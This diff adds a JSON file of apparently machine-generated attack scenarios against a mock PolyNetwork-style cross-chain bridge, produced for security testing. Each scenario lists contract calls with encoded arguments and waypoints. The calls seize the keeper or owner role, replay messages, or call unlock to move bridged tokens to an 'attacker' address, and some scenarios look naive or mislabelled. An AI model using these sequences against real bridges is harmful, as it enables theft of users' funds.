@@ -1,0 +1,801 @@
+{
+  "bridge_name": "polynetwork",
+  "scenarios": [
+    {
+      "scenario_id": "cross_chain_reentrancy",
+      "target_invariant": "asset_conservation_lock_unlock",
+      "vulnerability_class": "reentrancy",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "step": 3,
+          "chain": "source",
+          "contract": "SourceCrossChain",
+          "function": "crossChain(address,string,bytes)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Directly call crossChain to trigger another unlock"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call crossChain to trigger another unlock"
+        }
+      ]
+    },
+    {
+      "scenario_id": "authorization_unlock_manager_bypass",
+      "target_invariant": "authorization_unlock_manager",
+      "vulnerability_class": "access control",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "putCurEpochConPubKeyBytes(address)",
+          "params": {
+            "newKeeper": "attacker"
+          },
+          "description": "Attacker becomes the keeper by calling putCurEpochConPubKeyBytes"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SourceCrossChain",
+          "function": "crossChain(address,string,bytes)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Attacker triggers cross-chain event to call unlock on LockProxy"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker becomes the keeper by calling putCurEpochConPubKeyBytes"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker triggers cross-chain event to call unlock on LockProxy"
+        }
+      ]
+    },
+    {
+      "scenario_id": "auth_bypass_unlock",
+      "target_invariant": "authorization_unlock_proxy",
+      "vulnerability_class": "context_override",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Trigger cross-chain transfer which will emit CrossChainEvent"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthCrossChainManager",
+          "function": "verifyHeaderAndExecuteTx(address,string,bytes,address)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000",
+            "fromContract": "SourceCrossChain"
+          },
+          "description": "Directly call unlock bypassing the registered proxy check by setting fromContractContext"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Trigger cross-chain transfer which will emit CrossChainEvent"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call unlock bypassing the registered proxy check by setting fromContractContext"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_bridge_exploit",
+      "target_invariant": "authorization_lock_amount",
+      "vulnerability_class": "authorization_bypass",
+      "confidence": 0.5,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "0"
+          },
+          "description": "Attempt to deposit zero amount to bypass the require check"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SourceCrossChain",
+          "function": "crossChain(address,string,bytes)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Trigger cross-chain event with a zero amount to exploit the bridge"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attempt to deposit zero amount to bypass the require check"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Trigger cross-chain event with a zero amount to exploit the bridge"
+        }
+      ]
+    },
+    {
+      "scenario_id": "uniqueness_message_delivery_attack",
+      "target_invariant": "uniqueness_message_delivery",
+      "vulnerability_class": "replay_attack",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Attacker deposits tokens to trigger cross-chain transfer"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "EthCrossChainManager",
+          "function": "verifyHeaderAndExecuteTx(address,string,bytes,address)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000",
+            "fromContract": "SrcDeposit"
+          },
+          "description": "Attacker replays the same message to unlock tokens again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker deposits tokens to trigger cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker replays the same message to unlock tokens again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_value_mismatch",
+      "target_invariant": "asset_conservation_message_value",
+      "vulnerability_class": "incorrect_cross_chain_value_validation",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to trigger cross-chain transfer"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "putCurEpochConPubKeyBytes(address)",
+          "params": {
+            "newKeeper": "attacker"
+          },
+          "description": "Take control of the keeper role (exploiting missing access control)"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "EthCrossChainManager",
+          "function": "verifyHeaderAndExecuteTx(address,string,bytes,address)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000",
+            "fromContract": "SrcDeposit"
+          },
+          "description": "Execute malicious cross-chain transfer with inflated amount"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to trigger cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Take control of the keeper role (exploiting missing access control)"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Execute malicious cross-chain transfer with inflated amount"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_auth_bypass",
+      "target_invariant": "authorization_cross_chain_sender",
+      "vulnerability_class": "authorization_bypass",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate legitimate cross-chain transfer"
+        },
+        {
+          "step": 3,
+          "chain": "source",
+          "contract": "SourceCrossChain",
+          "function": "crossChain(address,string,bytes)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Directly call crossChain with spoofed arguments to bypass deposit contract check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate legitimate cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call crossChain with spoofed arguments to bypass deposit contract check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_reentrancy",
+      "target_invariant": "asset_conservation_escrow_balance",
+      "vulnerability_class": "reentrancy",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "LockProxy",
+            "amount": "100000000000000000000"
+          },
+          "description": "Manually add tokens to LockProxy balance before unlock completes"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer to attacker's address"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Manually add tokens to LockProxy balance before unlock completes"
+        }
+      ]
+    },
+    {
+      "scenario_id": "keeper_bypass",
+      "target_invariant": "authorization_keeper_access",
+      "vulnerability_class": "access_control",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "putCurEpochConPubKeyBytes(address)",
+          "params": {
+            "newKeeper": "attacker"
+          },
+          "description": "Attacker takes over keeper role"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "EthToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "attacker",
+            "amount": "1000000000000000000000000"
+          },
+          "description": "Attacker transfers tokens to themselves"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker takes over keeper role"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker transfers tokens to themselves"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross-chain-nonce-reuse",
+      "target_invariant": "uniqueness_nonce_validation",
+      "vulnerability_class": "replay attack",
+      "confidence": 0.5,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate a deposit to trigger a cross-chain event"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Reuse the same deposit to trigger another cross-chain event with the same nonce"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate a deposit to trigger a cross-chain event"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Reuse the same deposit to trigger another cross-chain event with the same nonce"
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_reentrancy",
+      "target_invariant": "asset_conservation_mint_burn",
+      "vulnerability_class": "reentrancy",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "SrcDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "SrcDeposit",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate cross-chain transfer which will trigger unlock on destination chain"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "LockProxy",
+            "amount": "100000000000000000000"
+          },
+          "description": "Send tokens to LockProxy to be unlocked again"
+        },
+        {
+          "step": 4,
+          "chain": "source",
+          "contract": "SourceCrossChain",
+          "function": "crossChain(address,string,bytes)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Trigger another unlock while the first one is still processing"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve SrcDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initiate cross-chain transfer which will trigger unlock on destination chain"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Send tokens to LockProxy to be unlocked again"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Trigger another unlock while the first one is still processing"
+        }
+      ]
+    },
+    {
+      "scenario_id": "admin_privilege_escalation",
+      "target_invariant": "authorization_admin_access",
+      "vulnerability_class": "privilege escalation",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "transferOwnership(address)",
+          "params": {
+            "o": "attacker"
+          },
+          "description": "Transfer ownership of EthCrossChainData to attacker"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "initKeeper(address)",
+          "params": {
+            "k": "attacker"
+          },
+          "description": "Set attacker as keeper in EthCrossChainData"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthCrossChainManager",
+          "function": "verifyHeaderAndExecuteTx(address,string,bytes,address)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "setManager(address)",
+            "args": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "fromContract": "SourceCrossChain"
+          },
+          "description": "Use attacker's keeper privilege to change LockProxy's manager"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "LockProxy",
+          "function": "setRegisteredProxy(address)",
+          "params": {
+            "p": "attacker"
+          },
+          "description": "Set attacker as registered proxy using new manager privilege"
+        },
+        {
+          "step": 5,
+          "chain": "destination",
+          "contract": "LockProxy",
+          "function": "unlock(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000"
+          },
+          "description": "Unlock all bridged tokens to attacker"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer ownership of EthCrossChainData to attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Set attacker as keeper in EthCrossChainData"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Use attacker's keeper privilege to change LockProxy's manager"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Set attacker as registered proxy using new manager privilege"
+        },
+        {
+          "waypoint_id": "w5",
+          "after_step": 5,
+          "predicate": "step_5_executed",
+          "description": "Unlock all bridged tokens to attacker"
+        }
+      ]
+    },
+    {
+      "scenario_id": "EthCrossChainManager_ownership_takeover",
+      "target_invariant": "authorization_owner_access",
+      "vulnerability_class": "access_control",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "transferOwnership(address)",
+          "params": {
+            "o": "attacker"
+          },
+          "description": "Attacker takes ownership of EthCrossChainData"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "EthCrossChainData",
+          "function": "putCurEpochConPubKeyBytes(address)",
+          "params": {
+            "newKeeper": "attacker"
+          },
+          "description": "Attacker sets themselves as the keeper"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "EthCrossChainManager",
+          "function": "verifyHeaderAndExecuteTx(address,string,bytes,address)",
+          "params": {
+            "toContract": "LockProxy",
+            "method": "unlock(address,uint256)",
+            "args": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000",
+            "fromContract": "SrcDeposit"
+          },
+          "description": "Attacker calls unlock through the manager to steal funds"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker takes ownership of EthCrossChainData"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker sets themselves as the keeper"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Attacker calls unlock through the manager to steal funds"
+        }
+      ]
+    }
+  ]
+}
